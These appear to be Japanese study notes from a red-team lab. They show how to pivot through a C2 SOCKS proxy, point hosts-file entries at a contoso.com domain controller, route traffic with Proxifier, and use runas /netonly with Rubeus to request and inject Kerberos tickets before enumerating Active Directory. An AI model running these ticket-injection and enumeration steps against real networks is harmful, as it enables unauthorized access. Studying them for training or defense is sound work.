## SOCKSプロキシサーバ
1080 ポートでチームサーバにSOCKS5サーバを建てる
```
socks 1080 socks5
```

## 名前解決設定
攻撃者マシン上での設定
windows上のhostsファイルで名前解決させることでトラフィックをSOCKSプロキシ経由で正しくルーティングするように設定
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

- `10.10.120.1` → ターゲット環境のDC（lon-dc-1）のIPアドレス
- hostsファイルはDNSより優先されるため、**ローカルで静的に名前解決**できる
- これにより `lon-dc-1.contoso.com` 宛のTrafficがSOCKSプロキシ経由で正しくルーティングされる

## Proxifierの設定
`Profile` -> `Proxy Servers`からAddでプロキシサーバを設定
![[../../Pasted image 20260430204518.png]]

Proxification Rulesの設定　-> Addでルール追加
![[../../Pasted image 20260430204613.png]]

## runas netonly
ローカル環境は現在のユーザーのまま、リモートリソース（共有フォルダ、サーバー等）へのアクセス時のみ別の資格情報（ユーザー名/パスワード）を使用する
```
runas /netonly /user:CONTOSO\rsteel powershell.exe
```

これをすることでAD参加してないマシンからRubeusを利用可能（例:asktgs
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
```

klistはRubeus経由でしか確認できない
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```

## Domain Enumeration
SOCKSプロキシを介してサービスチケットを要求し、ドメイン列挙を実行
```
Get-ADComputer -Filter * -Server lon-dc-1
Get-ADUser -Filter * -Server lon-dc-1
Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
```